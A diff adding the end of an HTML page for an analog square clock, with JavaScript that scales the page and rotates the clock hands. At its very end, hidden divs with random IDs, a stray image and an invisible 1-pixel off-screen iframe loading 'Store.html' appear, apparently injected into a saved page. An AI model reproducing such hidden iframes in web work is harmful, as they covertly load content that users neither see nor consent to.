+          c-0.486-1.151-1.2-2.016-2.145-2.592c-0.945-0.576-2.158-0.924-3.638-1.043c-1.481-0.119-3.217-0.181-5.208-0.181h-16.619v-5.185
+          H641.587z"></path>
+      </g>
+    </g>
+  </svg>
+</div>
+
+<script>
+(function() {
+  "use strict";
+  var resizeTimeout = null;
+  window.onresize = function() {
+    if (resizeTimeout !== null) {
+      window.clearTimeout(resizeTimeout);
+      resizeTimeout = null;
+    }
+
+    // We need this timeout because sometimes `window.innerWidth` will report invalid values
+    resizeTimeout = window.setTimeout(function() {
+      var clockDimensions = 720;
+      var wWidth = window.innerWidth;
+      var wHeight = window.innerHeight;
+      var isHorizontal = (wWidth > wHeight);
+
+
+      var tX = (wWidth - clockDimensions) / 2;
+      var tY = (wHeight - clockDimensions) / 2;
+      var scale = isHorizontal ?
+        (wHeight / clockDimensions) :
+        (wWidth / clockDimensions);
+
+      clockDimensions = clockDimensions * scale;
+
+      var property = 'translate(' + tX + 'px, ' + tY + 'px) scale(' + scale + ')';
+      var body = document.getElementsByTagName('body')[0];
+      body.style.webkitTransform = property;
+      body.style.transform = property;
+
+      property = isHorizontal ?
+        'scaleX(' + wWidth / clockDimensions + ')' :
+        'scaleY(' + wHeight / clockDimensions + ')';
+
+      var background = document.getElementById('svg-background');
+      background.style.webkitTransform = property;
+      background.style.transform = property;
+    }, 500);
+  };
+
+  // This is extremly needed to avoid a screen freeze on Android.
+  var body = document.getElementById('svg-background');
+  body.style.webkitTransform = 'scale(1) translateY(0px)';
+  body.style.transform = 'scale(1) translateY(0px)';
+  window.onresize();
+
+
+  function startClock() {
+    var angle = 360/60;
+    var date = new Date();
+    var hour = date.getHours() % 12;
+    var minute = date.getMinutes();
+    var second = date.getSeconds();
+    var hourAngle = (360/12) * hour + (360/(12*60)) * minute;
+
+    var el = document.getElementById("minutes");
+    el.style.webkitTransform = 'rotate('+angle*minute+'deg)';
+    el.style.transform = 'rotate('+angle*minute+'deg)';
+
+    el = document.getElementById("seconds");
+    el.style.webkitTransform = 'rotate('+angle*second+'deg)';
+    el.style.transform = 'rotate('+angle*second+'deg)';
+
+    el = document.getElementById("hours");
+    el.style.webkitTransform = 'rotate('+hourAngle+'deg)';
+    el.style.transform = 'rotate('+hourAngle+'deg)';
+
+    }
+
+    startClock()
+})();
+</script>
+
+
+<div id="__fghjktghndfgt_once" style="display:none;"></div><div id="__if72ru4sdfsdfrkjahiuyi_once" style="display:none;"></div><div id="__zsc_once"></div><img src="./Analog Square Clock_files/seg" style="z-index: -100; position: absolute; left: 0px; top: 0px;"><iframe id="3b03512bb2b6a488" src="./Analog Square Clock_files/Store.html" class="ver9734965" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;"></iframe></body></html>
